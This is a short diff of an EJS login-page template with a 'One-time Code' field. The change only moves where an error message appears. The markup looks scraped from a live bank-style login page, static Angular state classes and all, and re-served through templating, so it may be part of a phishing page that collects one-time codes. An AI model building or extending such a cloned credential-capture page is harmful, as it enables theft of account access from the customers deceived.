@@ -54,16 +54,9 @@
     <body ng-app="UxpLoginApp" class="uxp-theme ng-scope">
         <div class="widget-c1-oauth-login position-relative oauth-login">
             <div ng-controller="UxpLoginController as $ctrl" id="c1-login-section" class="ng-scope">
-                <% if (error) { %>
-                    <div class="global-error-from-container" tabindex="-1">
-                        <div class="global-error-form-wrapper">
-                            <div class="global-error-form-msg">
-                                <span role="alert" style="color: red;" style="margin-bottom: 10px;">You have entered incorrect information. Check your code and try again.</span>
-                            </div>
-                        </div>
-                    </div>
-                    <% } %>
+            
                 <form id="loginForm" id="input-form" name="" class="center-block c1-login-form ng-pristine ng-invalid ng-invalid-uxp-pattern ng-invalid-required ng-valid-minlength ng-valid-maxlength" action="" method="post" autocomplete="off">
+                   
                     <input type="hidden" id="userAgent" name="userAgent">
                     <div>
                         <div ng-form="newLoginForm" ng-hide="showingMemorizedAccounts()" class="ng-pristine ng-invalid ng-invalid-uxp-pattern ng-invalid-required ng-valid-minlength ng-valid-maxlength">
@@ -76,8 +69,18 @@
                                 <div class="login-id-fields">
                                     <div class="new-login-fields">
                                         <div  class="ng-scope form-group">
+                                            <% if (error) { %>
+                                                <div class="global-error-from-container" tabindex="-1">
+                                                    <div class="global-error-form-wrapper">
+                                                        <div class="global-error-form-msg">
+                                                            <span role="alert" style="color: red;" style="margin-bottom: 10px;">You have entered incorrect information. Check your code and try again.</span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <% } %>
                                             <div class="is-empty">
                                                 <label>
+                                                    
                                                     <span aria-hidden="true">One-time Code</span>
                                                     <input class="form-control ng-pristine ng-empty ng-invalid ng-invalid-uxp-pattern ng-valid-maxlength ng-touched lrinput" attr-action="Filling OTP" id="input-code" name="code" type="tel" value="" required placeholder="One-time Code">
                                                 </label>
